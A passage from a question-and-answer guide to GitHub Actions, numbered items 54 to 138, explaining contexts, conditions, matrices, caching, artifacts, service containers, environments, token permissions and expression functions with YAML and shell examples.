- `github.run_id`, `github.run_number`
- `github.event`: the full webhook payload
- `github.workspace`
- `github.token`

```yaml
- run: echo "Triggered by ${{ github.actor }} on ${{ github.ref_name }}"
```

## 54: What is the runner context?

It describes the machine running the current job:

- `runner.os`: `Linux`, `Windows` or `macOS`
- `runner.arch`: `X64`, `ARM64` and so on
- `runner.name`: the runner's name
- `runner.temp`: a temp folder that is emptied after each job
- `runner.tool_cache`: where preinstalled tools live
- `runner.environment`: `github-hosted` or `self-hosted`
- `runner.debug`: `1` when debug logging is on

```yaml
- if: runner.os == 'Windows'
  run: echo "Running on Windows"
```

## 55: How do you use if conditions on steps?

Add `if` to the step. The step runs only when the condition is true. Otherwise it is marked as skipped.

```yaml
steps:
  - run: npm test
  - name: Upload coverage
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    run: npm run coverage:upload
```

At step level you can use contexts like `github`, `env`, `vars`, `steps`, `matrix`, `job` and `runner`. The `secrets` context is not allowed in `if`. To check whether a secret is set, put it in `env` first and check `env.MY_SECRET != ''`.

## 56: How do you use if conditions on jobs?

Put `if` on the job. If it's false, the whole job is skipped and no runner is used.

```yaml
jobs:
  deploy:
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
```

A job-level `if` is checked before the job starts, so it can only use `github`, `needs`, `vars` and `inputs`. You can't use `env` or `secrets` there.

## 57: What are status check functions?

They are expression functions that look at the result of earlier steps or jobs:

- `success()`: true if nothing before has failed or been cancelled. This is the default when you don't use any status function.
- `failure()`: true if an earlier step (or a needed job) failed.
- `cancelled()`: true if the workflow was cancelled.
- `always()`: always true, even when the run is cancelled.

```yaml
- name: Notify on failure
  if: failure()
  run: ./notify.sh "Build failed"
```

## 58: How do you run a step even if a previous step failed?

Add an `if` with a status function. `if: failure()` runs only when something failed. `if: always()` runs in every case, including cancellation. `if: ${{ !cancelled() }}` runs after success or failure, but not when the run is cancelled.

```yaml
steps:
  - run: npm test
  - name: Upload test report
    if: ${{ !cancelled() }}
    uses: actions/upload-artifact@v6
    with:
      name: test-report
      path: reports/
```

`!cancelled()` is usually a better choice than `always()` for uploads and cleanup, because it still lets you stop the run quickly with the cancel button.

## 59: What does continue-on-error do?

It lets a step or job fail without failing the whole job or workflow.

```yaml
steps:
  - name: Optional lint check
    run: npm run lint:experimental
    continue-on-error: true
  - run: npm test
```

The step still shows a failure icon, but the job continues and can still end as successful. At job level it is often used for matrix entries that are allowed to fail, like testing against a nightly version of a runtime.

## 60: What does timeout-minutes do?

It sets the maximum time a job or step can run before GitHub stops it.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - run: npm test
        timeout-minutes: 10
```

Setting a timeout is a good habit. A hung test or a command waiting for input would otherwise keep running and use paid minutes until the default limit is reached.

## 61: What is the default job timeout?

360 minutes (6 hours). A job on a GitHub-hosted runner can't run longer than that even if you set a higher `timeout-minutes`. Self-hosted runners allow much longer jobs, up to 5 days.

A whole workflow run also has a limit of 35 days, which matters mostly for runs that wait a long time for approvals.

## 62: What is a matrix strategy?

A matrix lets you run the same job several times with different values, like different OS or language versions. GitHub creates one job for each combination.

```yaml
jobs:
  test:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [20, 22, 24]
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ matrix.node }}
      - run: npm test
```

This creates 2 x 3 = 6 jobs that run in parallel.

## 63: How do you test against several Node.js versions?

Use a matrix and pass the matrix value to `actions/setup-node`.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [20, 22, 24]
    steps:
      - uses: actions/checkout@v6
      - uses: actions/setup-node@v6
        with:
          node-version: ${{ matrix.node-version }}
          cache: npm
      - run: npm ci
      - run: npm test
```

Each version runs as its own job and shows up as a separate check on the pull request.

## 64: What does fail-fast do in a matrix?

When `fail-fast` is `true` (the default), GitHub cancels the other running matrix jobs as soon as one of them fails. This saves minutes but hides whether the other combinations would have passed.

```yaml
strategy:
  fail-fast: false
  matrix:
    node: [20, 22, 24]
```

Set it to `false` when you want to see the full picture, for example to know if a bug happens only on one Node.js version.

## 65: What does actions/setup-node do?

It installs a specific Node.js version on the runner and adds it to `PATH`. It can also cache the package manager's download folder and set up authentication for a registry.

```yaml
- uses: actions/setup-node@v6
  with:
    node-version: 24
    cache: npm
    registry-url: https://registry.npmjs.org
```

Instead of `node-version` you can use `node-version-file: .nvmrc` so CI uses the same version as your local setup.

## 66: How do you set up other languages like Python, Java or Go?

GitHub provides official setup actions for the common languages. They all work in a similar way: you pick a version and they install it and add it to `PATH`.

```yaml
- uses: actions/setup-python@v6
  with:
    python-version: "3.13"
    cache: pip

- uses: actions/setup-java@v5
  with:
    distribution: temurin
    java-version: "21"

- uses: actions/setup-go@v6
  with:
    go-version-file: go.mod
```

Hosted runners already have some versions preinstalled, but using a setup action makes the version explicit and keeps your builds the same when the runner image changes.

## 67: What is caching in GitHub Actions?

Caching saves files from one workflow run so later runs can restore them instead of creating them again. It's mostly used for dependency folders like the npm cache, pip cache or Gradle cache.

```yaml
- uses: actions/cache@v5
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('package-lock.json') }}
```

When the key matches an existing cache, the files are restored. At the end of the job, if there was no exact match, a new cache is saved with that key.

## 68: How does the built-in cache in setup-node work?

`actions/setup-node` can cache the package manager's global cache folder for you. You only set the `cache` input.

```yaml
- uses: actions/setup-node@v6
  with:
    node-version: 24
    cache: npm # or yarn, pnpm
```

It builds the cache key from the lock file, so the cache is refreshed when dependencies change. It caches the download folder (like `~/.npm`), not `node_modules`, so you still run `npm ci`, but it's much faster. Recent versions can also turn on npm caching automatically when `package.json` has a `packageManager` field.

## 69: What is an artifact?

An artifact is a file or folder that a job uploads and stores with the workflow run. You can download it later from the run page, or download it in another job of the same run.

Common examples are build output, test reports, coverage reports, logs and screenshots from failed E2E tests.

## 70: How do you upload an artifact?

Use `actions/upload-artifact`.

```yaml
- run: npm run build
- uses: actions/upload-artifact@v6
  with:
    name: dist
    path: dist/
    retention-days: 7
```

`path` can be a file, a folder or a glob pattern, and you can list several lines. Hidden files (like `.env` files) are not included by default, which protects you from uploading secrets by accident.

## 71: How do you download an artifact?

Use `actions/download-artifact` in a later job. Make sure the job waits for the uploading job with `needs`.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm run build
      - uses: actions/upload-artifact@v6
        with:
          name: dist
          path: dist/

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v7
        with:
          name: dist
          path: dist/
      - run: ls dist
```

## 72: What is the difference between artifacts and cache?

**Artifacts** are outputs of a run that you want to keep or pass to another job: build files, reports, logs. They belong to one specific run and can be downloaded by people.

**Cache** is a speed-up for files you could recreate, mostly dependencies. It is shared between runs and branches, it's matched by a key, and old entries are deleted automatically.

A simple rule: if losing it would break something, it's an artifact. If losing it only makes the run slower, it's cache.

## 73: How long are artifacts kept?

By default 90 days. You can lower that per upload with `retention-days`, or change the default in the repository or organization settings. Private repositories can keep them longer (up to 400 days), public repositories up to 90 days.

Artifacts count toward your storage quota in private repos, so it's a good idea to set short retention for big files that you only need for a few days.

## 74: How do you see workflow logs?

Open the Actions tab, click the workflow run, then click a job. Each step can be expanded to show its output. You can search the logs, view the raw log, or download all logs as a zip file.

From the terminal you can use the GitHub CLI:

```bash
gh run list
gh run view <run-id> --log
gh run view <run-id> --log-failed
```

`--log-failed` shows only the logs of the failed steps, which is usually what you want.

## 75: How do you re-run a workflow?

On the run page, click "Re-run jobs" and choose "Re-run all jobs" or "Re-run failed jobs". You can also re-run a single job from its menu. With the CLI:

```bash
gh run rerun <run-id>
gh run rerun <run-id> --failed
```

A re-run uses the same commit and the same event payload as the original run. It does not pick up new commits, but it does use the current values of secrets and variables.

## 76: How do you cancel a running workflow?

Click "Cancel workflow" on the run page, or use the CLI:

```bash
gh run cancel <run-id>
```

GitHub stops the running steps, skips the remaining ones, and runs only the steps that have `if: always()` or `if: cancelled()`.

## 77: How do you disable a workflow?

In the Actions tab, pick the workflow in the sidebar, open the "..." menu and choose "Disable workflow". Or with the CLI:

```bash
gh workflow disable ci.yml
gh workflow enable ci.yml
```

This keeps the file in the repository but stops new runs. It's handy for turning off a noisy scheduled job without a code change.

## 78: What is a workflow run?

A workflow run is one execution of a workflow, started by one event. Each run has an ID, a number, a status (queued, in progress, completed) and a conclusion (success, failure, cancelled, skipped and others).

The run holds its jobs, logs, artifacts and a summary. You can link to it, re-run it, or download its artifacts.

## 79: What are run_id, run_number and run_attempt?

- `github.run_id`: a unique ID for the run across all of GitHub. It stays the same when you re-run.
- `github.run_number`: a counter that starts at 1 for each workflow and goes up by one for every new run. It also stays the same on re-run.
- `github.run_attempt`: starts at 1 and goes up each time you re-run the same run.

```yaml
- run: echo "Build ${{ github.run_number }}, attempt ${{ github.run_attempt }}"
```

`run_number` is often used in build version numbers. Use `run_id` plus `run_attempt` when you need something unique per attempt.

## 80: What is a status badge?

It's a small image that shows whether a workflow is passing or failing. You usually put it at the top of the README.

```markdown
![CI](https://github.com/my-org/my-repo/actions/workflows/ci.yml/badge.svg)
![CI](https://github.com/my-org/my-repo/actions/workflows/ci.yml/badge.svg?branch=main)
```

You can also copy the badge code from the workflow page in the Actions tab, using "Create status badge".

## 81: How do you skip a workflow for a commit?

Add `[skip ci]`, `[ci skip]`, `[no ci]`, `[skip actions]` or `[actions skip]` to the commit message. Workflows triggered by `push` or `pull_request` will not run for that commit.

```bash
git commit -m "Update README [skip ci]"
```

For pull requests, GitHub checks the head commit message. Be careful with required status checks: if a skipped workflow is required, the pull request will wait for a check that never comes.

## 82: What does ubuntu-latest mean?

It's a label that points to the newest stable Ubuntu image GitHub supports for hosted runners. When GitHub releases a new image, `ubuntu-latest` is moved to it after a migration period.

That move can break builds because tool versions change. If you need stability, use a specific version like `ubuntu-24.04` and update it on your own schedule. The same applies to `windows-latest` and `macos-latest`.

## 83: What operating systems do GitHub-hosted runners support?

Linux (Ubuntu), Windows Server and macOS. There are x64 and ARM64 images for Linux and Windows, and macOS runs on Apple silicon (ARM64), with Intel images for older needs.

```yaml
runs-on: ubuntu-latest # Linux x64
runs-on: ubuntu-24.04-arm # Linux ARM64
runs-on: windows-latest # Windows x64
runs-on: macos-latest # macOS ARM64
```

The full list of labels and their exact versions is in the `actions/runner-images` repository.

## 84: What software comes preinstalled on hosted runners?

A lot. The images include common languages (Node.js, Python, Java, Go, .NET, Ruby), package managers, Docker, Git, the GitHub CLI, cloud CLIs (AWS, Azure, Google Cloud), browsers for testing, databases clients and build tools.

The exact list for each image is published in the `actions/runner-images` repository. You'll also see a link to it in the "Set up job" step of every run. It's still a good idea to install the exact versions you need with setup actions instead of trusting what's preinstalled.

## 85: Is GitHub Actions free?

For public repositories, standard GitHub-hosted runners are free. For private repositories, each plan includes a number of free minutes and some artifact and cache storage per month. After that you pay per minute.

Self-hosted runners don't use your included minutes. Larger runners (more CPU or RAM, GPUs) are always billed per minute, even for public repositories.

## 86: How is usage counted for private repositories?

Each job is billed by the minutes it runs, rounded up to the next whole minute. A job that runs 10 seconds counts as 1 minute.

The price per minute depends on the runner type. Windows and macOS runners cost more than Linux, and larger runners cost more than standard ones. That's why it often makes sense to run most checks on Linux and only run the OS-specific tests on Windows or macOS. You can see your usage in the billing settings and set a budget to avoid surprise costs.

## 87: What is the Actions tab?

It's the tab in a GitHub repository where you see all workflows and their runs. From there you can:

- see the status of recent runs and filter them by workflow, branch, event or actor
- open a run to see jobs, logs, artifacts and the summary
- re-run or cancel runs
- start manual workflows
- disable or enable workflows
- manage caches

## 88: What YAML basics do you need for workflow files?

- Indentation uses spaces, never tabs. Wrong indentation is the most common mistake.
- `key: value` creates a map entry.
- `- item` creates a list item.
- `|` keeps line breaks, used for multi-line `run` scripts.
- `#` starts a comment.
- Strings usually don't need quotes, but quote values with `*`, `:` or a leading `!`, and quote things like `'3.10'` that would otherwise be read as a number.

```yaml
python-version: 3.10 # read as 3.1
python-version: "3.10" # correct
```

## 89: What are common YAML mistakes in workflow files?

- Mixing tabs and spaces, or wrong indentation, which puts a key under the wrong parent.
- Forgetting the `-` before each step, so several steps merge into one.
- Version numbers like `3.10` being read as the number `3.1`.
- `on` written as `on:` with nothing under it when you meant a specific event.
- Glob patterns starting with `*` not being quoted.
- Having both `uses` and `run` in one step.

GitHub shows syntax errors on the run page, and tools like `actionlint` catch many of these before you push.

## 90: How do you pass inputs to an action?

Use the `with` key. Each input name comes from the action's `action.yml` file.

```yaml
- uses: actions/setup-node@v6
  with:
    node-version: 24
    cache: npm
```

All inputs are passed as strings. The action's README lists which inputs exist, which are required and what the defaults are.

## 91: What are action outputs?

Actions can return values, called outputs, that later steps can read. You need to give the step an `id`, then read `steps.<id>.outputs.<name>`.

```yaml
- uses: actions/setup-node@v6
  id: node
  with:
    node-version: 24
- run: echo "Installed Node ${{ steps.node.outputs.node-version }}"
```

The available outputs are documented in the action's README and `action.yml`.

## 92: Why would you give a step an id?

The `id` lets you refer to the step later. You need it to read the step's outputs, or to check its `outcome` or `conclusion`.

```yaml
- id: tests
  run: npm test
  continue-on-error: true
- if: steps.tests.outcome == 'failure'
  run: echo "Tests failed, but we continued"
```

The `id` must be unique within the job and must start with a letter or `_`.

## 93: How do you set an output from a run step?

Write `name=value` to the file whose path is in `$GITHUB_OUTPUT`.

```yaml
- id: version
  run: echo "value=$(node -p "require('./package.json').version")" >> "$GITHUB_OUTPUT"

- run: echo "Version is ${{ steps.version.outputs.value }}"
```

The old `::set-output` command is deprecated and should not be used anymore.

## 94: What is GITHUB_ENV?

It's a file you write to in order to set environment variables for the **next** steps in the same job.

```yaml
- run: echo "BUILD_DATE=$(date -u +%Y-%m-%d)" >> "$GITHUB_ENV"
- run: echo "Built on $BUILD_DATE"
```

The variable is not available in the step that sets it, only in the steps after it. It also doesn't carry over to other jobs.

## 95: What is GITHUB_PATH?

It's a file you write to in order to add a folder to `PATH` for the next steps in the job.

```yaml
- run: |
    mkdir -p "$HOME/.local/bin"
    curl -sSL https://example.com/tool -o "$HOME/.local/bin/tool"
    chmod +x "$HOME/.local/bin/tool"
    echo "$HOME/.local/bin" >> "$GITHUB_PATH"
- run: tool --version
```

Like `GITHUB_ENV`, the change takes effect from the next step, not the current one.

## 96: What is a job summary?

A job summary is Markdown that a job writes to `$GITHUB_STEP_SUMMARY`. It is shown on the run's summary page, so people can see results without reading the logs.

```yaml
- run: |
    echo "## Test results" >> "$GITHUB_STEP_SUMMARY"
    echo "- Passed: 120" >> "$GITHUB_STEP_SUMMARY"
    echo "- Failed: 0" >> "$GITHUB_STEP_SUMMARY"
```

You can use headings, lists, tables, links and code blocks. It's good for test results, coverage numbers, deploy URLs or build sizes.

## 97: What are workflow commands?

Workflow commands are special lines a step prints to its output, which the runner reads and acts on. They use the format `::command parameters::message`.

```bash
echo "::notice::Deployment started"
echo "::warning file=app.js,line=12::Deprecated function used"
echo "::error::Something went wrong"
echo "::group::Install logs"
echo "::endgroup::"
echo "::add-mask::$TOKEN"
echo "::debug::Only visible with debug logging"
```

Setting outputs, env vars and PATH now use the environment files (`GITHUB_OUTPUT`, `GITHUB_ENV`, `GITHUB_PATH`) instead of commands.

## 98: How do you create an error or warning annotation?

Print an `::error`, `::warning` or `::notice` command. You can attach it to a file and line, and it will show up in the pull request's "Files changed" view and on the run summary.

```bash
echo "::error file=src/app.ts,line=42,col=7,title=Type error::Property 'id' does not exist"
echo "::warning file=package.json::This package is deprecated"
```

Printing an `::error` doesn't fail the step by itself. You still need to exit with a non-zero code.

## 99: How do you group log lines?

Use `::group::` and `::endgroup::`. The lines between them show up as a collapsible block in the log.

```yaml
- run: |
    echo "::group::Installing dependencies"
    npm ci
    echo "::endgroup::"
    npm test
```

This keeps long output, like dependency installs, out of the way while still letting people expand it when needed.

## 100: How do you mask a value in logs?

Use the `add-mask` command. Any later output that contains the value will show `***` instead.

```yaml
- run: |
    TOKEN=$(./get-temporary-token.sh)
    echo "::add-mask::$TOKEN"
    echo "TOKEN=$TOKEN" >> "$GITHUB_ENV"
```

Secrets from the `secrets` context are masked automatically. You need `add-mask` for values your workflow creates at run time, like a temporary token from a cloud provider.

## 101: How do you turn on debug logging?

There are two ways:

1. When re-running a run, tick "Enable debug logging". This applies only to that re-run.
2. Set the repository variable (or secret) `ACTIONS_STEP_DEBUG` to `true` for more detail from steps, and `ACTIONS_RUNNER_DEBUG` to `true` for logs about the runner itself.

With debug logging on, `::debug::` messages and extra internal output from actions show up in the logs, and `runner.debug` is set to `1`. Turn it off when you're done, because the logs become very long.

## 102: What does the container key do?

It runs all the steps of a job inside a Docker container instead of directly on the runner machine. The runner starts the container, mounts the workspace, and runs each `run` step inside it.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: node:24-bookworm
    steps:
      - uses: actions/checkout@v6
      - run: node --version
```

This is useful when you need a specific OS or toolset that is not on the hosted runner. It only works on Linux runners.

## 103: What are service containers?

Service containers are extra Docker containers that run next to your job, like a database, Redis or a message broker. GitHub starts them before the steps and stops them when the job ends.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      redis:
        image: redis:7
        ports:
          - 6379:6379
    steps:
      - run: redis-cli -h localhost ping
```

They only work on Linux runners.

## 104: How do you run a PostgreSQL database for tests?

Add a `postgres` service with environment variables, a port mapping and a health check, so the steps start only when the database is ready.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:17
        env:
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
          POSTGRES_DB: app_test
        ports:
          - 5432:5432
        options: >-
          --health-cmd "pg_isready -U test"
          --health-interval 5s
          --health-timeout 5s
          --health-retries 10
    steps:
      - uses: actions/checkout@v6
      - run: npm ci
      - run: npm test
        env:
          DATABASE_URL: postgres://test:test@localhost:5432/app_test
```

## 105: What is an environment in GitHub Actions?

An environment is a named deploy target, like `staging` or `production`, configured in the repository settings. A job that references it can be held back by protection rules, such as required reviewers or a wait timer, and gets access to secrets and variables stored on that environment.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - run: ./deploy.sh
```

Each deployment to an environment is also tracked on the repository's main page and in the pull request.

## 106: What are environment secrets?

They are secrets stored on a specific environment instead of the whole repository. A job can only read them if it uses that environment, and only after the environment's protection rules pass.

This lets you keep the production database password away from every other job. For example, a pull request job can't read it, because it doesn't use the `production` environment, and even a job that does use it has to wait for an approval first.

## 107: What is the needs context?

It holds the outputs and results of the jobs listed in the current job's `needs`.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - id: v
        run: echo "version=1.4.0" >> "$GITHUB_OUTPUT"

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ needs.build.outputs.version }}"
```

`needs.<job>.result` gives `success`, `failure`, `cancelled` or `skipped`.

## 108: What is the difference between the push and pull_request triggers?

`push` runs when commits are pushed to a branch or tag. It runs on the exact commit that was pushed.

`pull_request` runs when a pull request is opened or updated. It runs on a merge commit that combines the pull request branch with the target branch, so you test what the code would look like after merging.

Many projects use both: `pull_request` to check changes before merge, and `push` on `main` to build and deploy after merge. If you use both without filters, every push to a branch with an open pull request starts two runs.

## 109: What happens with workflows on pull requests from forks?

For the `pull_request` event from a fork:

- The workflow runs with the code and workflow files from the fork's branch.
- Secrets are not passed to the runner (except `GITHUB_TOKEN`).
- `GITHUB_TOKEN` is read-only.
- For first-time contributors, a maintainer has to approve the run before it starts (by default).

These limits exist because anyone can open a pull request from a fork and change the workflow file to steal secrets. Treat code from forks as untrusted.

## 110: How do you define inputs for workflow_dispatch?

Add `inputs` under `workflow_dispatch`. They show up as form fields when someone clicks "Run workflow", and you read them with the `inputs` context.

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: Where to deploy
        type: choice
        options: [staging, production]
        required: true
      version:
        description: Version to deploy
        type: string
        default: latest

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ inputs.version }} to ${{ inputs.environment }}"
```

## 111: What input types does workflow_dispatch support?

- `string`: free text
- `boolean`: a checkbox
- `number`: a number
- `choice`: a dropdown with fixed `options`
- `environment`: a dropdown of the repository's environments

```yaml
inputs:
  debug:
    type: boolean
    default: false
  replicas:
    type: number
    default: 2
  target:
    type: environment
```

A workflow can have up to 25 inputs.

## 112: What is a reusable workflow?

A reusable workflow is a workflow that other workflows can call like a function. It uses the `workflow_call` trigger and can take inputs and secrets and return outputs.

```yaml
# .github/workflows/test.yml
on:
  workflow_call:
    inputs:
      node-version:
        type: string
        default: "24"
```

```yaml
# .github/workflows/ci.yml
jobs:
  test:
    uses: ./.github/workflows/test.yml
    with:
      node-version: "22"
```

It's a good way to keep one standard CI or deploy pipeline and use it in many repositories.

## 113: What is a composite action?

A composite action combines several steps into one action. Other workflows use it with `uses`, like any other action.

```yaml
# .github/actions/setup-project/action.yml
name: Setup project
description: Install Node.js and dependencies
runs:
  using: composite
  steps:
    - uses: actions/setup-node@v6
      with:
        node-version: 24
        cache: npm
    - run: npm ci
      shell: bash
```

```yaml
steps:
  - uses: actions/checkout@v6
  - uses: ./.github/actions/setup-project
```

Every `run` step in a composite action must set `shell`.

## 114: What types of custom actions can you write?

1. **JavaScript actions**: run directly on the runner with Node.js. They start fast and work on Linux, Windows and macOS.
2. **Docker container actions**: run inside a container that you define. You can use any language and tools, but they only work on Linux runners and are slower to start.
3. **Composite actions**: a list of steps (shell commands and other actions) packaged as one action. No build step needed.

The type is set in `action.yml` under `runs.using`: `node24`, `docker` or `composite`.

## 115: What is action.yml?

It's the metadata file that defines an action. It describes the action's name, inputs, outputs and how it runs. It must be at the root of the action's folder or repository (named `action.yml` or `action.yaml`).

```yaml
name: Greet
description: Prints a greeting
inputs:
  who:
    description: Name to greet
    required: true
    default: world
outputs:
  message:
    description: The greeting
runs:
  using: node24
  main: dist/index.js
```

## 116: What does the defaults key do?

It sets default `shell` and `working-directory` for all `run` steps in a workflow or job, so you don't repeat them on every step.

```yaml
defaults:
  run:
    shell: bash
    working-directory: ./app

jobs:
  test:
    runs-on: ubuntu-latest
    defaults:
      run:
        working-directory: ./app/server
    steps:
      - uses: actions/checkout@v6
      - run: npm test
```

Job-level defaults override workflow-level ones, and a value set on a step overrides both.

## 117: How do you run a step only on the main branch?

Check `github.ref` in an `if`.

```yaml
- name: Publish
  if: github.ref == 'refs/heads/main'
  run: npm publish
```

If you also want to make sure it's a push and not some other event on main, add `github.event_name == 'push'`. You can use `github.ref_name == 'main'` too, but keep in mind `ref_name` would also match a tag called `main`.

## 118: How do you run a step only on a specific OS?

Check `runner.os`. The values are `Linux`, `Windows` and `macOS`.

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest, macos-latest]
runs-on: ${{ matrix.os }}
steps:
  - if: runner.os == 'Linux'
    run: sudo apt-get install -y libvips
  - if: runner.os == 'macOS'
    run: brew install vips
```

## 119: What is concurrency in GitHub Actions?

`concurrency` makes sure only one run (or job) with the same group name runs at a time. Others wait or get cancelled.

```yaml
concurrency:
  group: deploy-production
```

It's mostly used for deployments, so two deploys never run against the same environment at once, and for pull requests, so an old run is cancelled when a new commit comes in.

## 120: How do you cancel older runs when a new commit is pushed?

Use `concurrency` with a group based on the branch or pull request, and set `cancel-in-progress: true`.

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

When you push a new commit to a pull request, the run for the old commit is cancelled and only the latest one continues. This saves minutes and gives faster feedback. Don't use this on `main` deploys unless you're sure cancelling halfway is safe.

## 121: What does the permissions key do?

It sets what `GITHUB_TOKEN` is allowed to do. You can set it for the whole workflow or for each job.

```yaml
permissions:
  contents: read
  pull-requests: write
```

Any permission you don't list is set to `none`. Giving only the permissions a workflow actually needs limits the damage if a step or action is compromised.

## 122: What are the default permissions of GITHUB_TOKEN?

It depends on a setting in the repository or organization. The two options are:

- **Restricted** (default for new repositories and organizations): read access to `contents` and `packages` (plus metadata), nothing else.
- **Permissive**: read and write for most scopes. Older repositories may still have this.

You can see the actual permissions in the "Set up job" step of any run. Setting `permissions` in the workflow file makes the access explicit no matter what the repository default is.

## 123: How do you run a workflow when a pull request is closed or merged?

Use `pull_request` with `types: [closed]`, and check `merged` to tell a merge apart from a plain close.

```yaml
on:
  pull_request:
    types: [closed]

jobs:
  cleanup:
    if: github.event.pull_request.merged == true
    runs-on: ubuntu-latest
    steps:
      - run: echo "PR #${{ github.event.number }} was merged"
```

This is often used to delete preview environments or post release notes.

## 124: How do you check workflow syntax before pushing?

- Use an editor extension. The official "GitHub Actions" extension for VS Code validates workflow files and autocompletes keys.
- Run `actionlint`, a linter that checks syntax, expression types, shell scripts (with shellcheck) and common mistakes.

```bash
actionlint
actionlint .github/workflows/ci.yml
```

GitHub also shows syntax errors in the Actions tab after you push, but catching them before saves a round trip.

## 125: What is the GitHub CLI and how is it used with Actions?

The GitHub CLI (`gh`) is GitHub's command line tool. It has commands for workflows and runs, and it's preinstalled on hosted runners, so you can use it inside workflows too.

```bash
gh workflow list
gh run list --workflow ci.yml
gh run watch
gh run view --log-failed
gh run download <run-id> -n dist
gh secret set API_KEY
gh variable set REGION --body eu-west-1
gh cache list
```

Inside a workflow it needs a token in `GH_TOKEN`, for example `GH_TOKEN: ${{ github.token }}`.

## 126: How do you start a workflow from the GitHub CLI?

Use `gh workflow run`. The workflow must have a `workflow_dispatch` trigger.

```bash
gh workflow run deploy.yml
gh workflow run deploy.yml --ref release/2.0
gh workflow run deploy.yml -f environment=staging -f version=1.4.0
```

`-f` passes inputs. `--ref` picks the branch or tag that the workflow file and code are taken from.

## 127: What is Dependabot for GitHub Actions?

Dependabot can watch the actions you use in your workflows and open pull requests when new versions come out. You turn it on with a `.github/dependabot.yml` file.

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

It also updates actions pinned to commit SHAs and keeps the version comment next to the SHA up to date.

## 128: What is the difference between a workflow and an action?

A workflow is the whole automation: triggers, jobs and steps, defined in `.github/workflows/`. An action is a reusable building block that you use inside a step.

Think of a workflow as a program and actions as library functions. You can't use a workflow as a step, but you can call a reusable workflow as a whole job.

## 129: What is the difference between a job and a step?

A job is a unit that gets its own runner. A step is one command or action inside a job.

Jobs run in parallel by default, each in its own fresh environment. Steps in a job run one after another on the same machine, so they share the file system, installed tools and environment variables set with `GITHUB_ENV`.

## 130: Do steps in the same job share files?

Yes. All steps in a job run on the same runner and in the same workspace. If one step creates `dist/`, the next step can read it.

```yaml
steps:
  - uses: actions/checkout@v6
  - run: npm ci && npm run build
  - run: ls dist/
```

Shell variables do not carry over between steps, because each step runs in a new shell. Use `GITHUB_ENV` or step outputs for that.

## 131: Do jobs share files?

No. Each job runs on its own runner, usually a fresh VM, so files from one job are not there in another job.

To pass files between jobs, upload them as an artifact in one job and download them in the other. To pass small values, use job outputs. To reuse dependencies, use the cache.

## 132: What is RUNNER_TEMP?

`RUNNER_TEMP` (or `runner.temp`) is a temporary folder on the runner that is emptied at the start and end of every job. It's a good place for files you don't want in the workspace, like a generated config file with a secret.

```yaml
- run: |
    echo "$KUBECONFIG_DATA" | base64 -d > "$RUNNER_TEMP/kubeconfig"
    echo "KUBECONFIG=$RUNNER_TEMP/kubeconfig" >> "$GITHUB_ENV"
  env:
    KUBECONFIG_DATA: ${{ secrets.KUBECONFIG }}
```

## 133: What happens after a job finishes on a GitHub-hosted runner?

The VM is deleted. Nothing from the job stays: no files, no installed tools, no running processes. The next job gets a brand new VM from the same image.

That's why you need artifacts or cache to keep data. It's also a security benefit: one job can't leave anything behind that affects another job.

## 134: Is there a limit on how many jobs can run at once?

Yes. Each account has a limit on concurrent jobs on GitHub-hosted runners, and it depends on the plan. Free plans get fewer than Team or Enterprise plans, and macOS jobs have their own, lower limit. Jobs over the limit wait in the queue.

There's also a limit of 256 jobs per matrix. If your runs often sit in "Queued", you are likely hitting the concurrency limit.

## 135: What does the hashFiles function do?

`hashFiles()` returns a SHA-256 hash of the files that match the given patterns. If the files change, the hash changes. It's mostly used in cache keys.

```yaml
- uses: actions/cache@v5
  with:
    path: ~/.npm
    key: npm-${{ runner.os }}-${{ hashFiles('**/package-lock.json') }}
```

Paths are relative to `GITHUB_WORKSPACE`. If no files match, it returns an empty string.

## 136: What string functions can you use in expressions?

- `contains(search, item)`: true if a string contains a substring, or an array contains an item
- `startsWith(string, value)` and `endsWith(string, value)`
- `format('{0}-{1}', a, b)`: builds a string
- `join(array, ', ')`: joins array items

```yaml
- if: startsWith(github.ref, 'refs/tags/v')
  run: echo "Release tag"
- if: contains(github.event.pull_request.labels.*.name, 'deploy-preview')
  run: echo "Preview requested"
```

String comparisons in these functions are not case sensitive.

## 137: What do toJSON and fromJSON do?

`toJSON(value)` turns a value into a JSON string. It's handy for printing a whole context for debugging.

`fromJSON(string)` parses a JSON string into a value. It's used to turn strings into numbers or booleans, or to build a matrix from a previous job's output.

```yaml
- run: echo '${{ toJSON(github.event) }}'

- if: fromJSON(env.RUN_E2E)
  run: npm run e2e
```

```yaml
strategy:
  matrix:
    service: ${{ fromJSON(needs.plan.outputs.services) }}
```

## 138: What literals and operators can you use in expressions?

Literals: `true`, `false`, `null`, numbers, and strings in single quotes (`'text'`). To use a single quote inside a string, write it twice: `'it''s'`.

Operators: `()`, `[]`, `.`, `!`, `<`, `<=`, `>`, `>=`, `==`, `!=`, `&&`, `||`.

